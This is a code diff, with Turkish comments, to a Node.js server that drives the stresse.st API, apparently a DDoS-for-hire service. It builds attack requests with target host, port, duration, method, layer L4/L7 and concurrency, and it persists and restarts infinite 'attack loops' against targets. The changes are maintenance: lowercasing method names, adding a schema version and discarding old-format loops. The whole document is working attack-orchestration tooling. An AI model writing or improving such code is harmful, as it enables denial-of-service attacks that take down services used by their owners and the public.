@@ -226,6 +226,19 @@ function loadState() {
       const raw = fs.readFileSync(LOOPS_FILE, 'utf8');
       const parsed = JSON.parse(raw);
       Object.entries(parsed).forEach(([loopId, loop]) => {
+        // Eski formattaki loop'lari at: URL protokolu iceren host, buyuk harfli method,
+        // veya schemaVersion olmayan kayitlar. Bu loop'lar yeni kodla calismaz ve
+        // sonsuz hata uretirler.
+        const host = loop.params?.host || '';
+        const method = loop.params?.method || '';
+        const isOldFormat =
+          /^https?:\/\//i.test(host) ||
+          method !== method.toLowerCase() ||
+          !loop.schemaVersion;
+        if (isOldFormat) {
+          console.log(`[persistence] Eski format loop atildi: ${loopId}`);
+          return;
+        }
         // Only restore infinite loops; finite loops with at least one round are considered done
         if (loop.params?.infinite && loop.running !== false) {
           activeLoops[loopId] = { ...loop, running: true, roundAttackIds: [] };
@@ -323,10 +336,12 @@ function buildApiUrl(apiToken, params) {
   // stresse.st API her iki katmanda da sadece IP/domain bekler; URL protokol/path istemez.
   // Kullanici https://example.com/, http://example.com veya example.com girse de ayni sonuc cikmalidir.
   let host = normalizeHost(params.host);
+  // stresse.st API method isimlerini kucuk harfle bekler (ornegin go-nebula, cloudflare)
+  const method = String(params.method || '').toLowerCase();
   // L7 geo suffix .txt olmali
   const geo = isL7 ? `${params.geo || 'russia'}.txt` : (params.geo || 'russia');
-  const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(params.method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
-  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} url=${url}`);
+  const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
+  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} method=${method} url=${url}`);
   return url;
 }
 
@@ -1354,7 +1369,8 @@ app.post('/api/stresse/loop', async (req, res) => {
       running: true,
       sessionId,
       historyId,
-      params: { host, port: parseInt(port), time: parseInt(time), method, subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer },
+      schemaVersion: 1,
+      params: { host, port: parseInt(port), time: parseInt(time), method: method.toLowerCase(), subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer },
       displayTarget: layer === 'L7' ? host : `${host}:${port}`,
       startedAt: new Date().toISOString(),
       lastRoundAt: null,
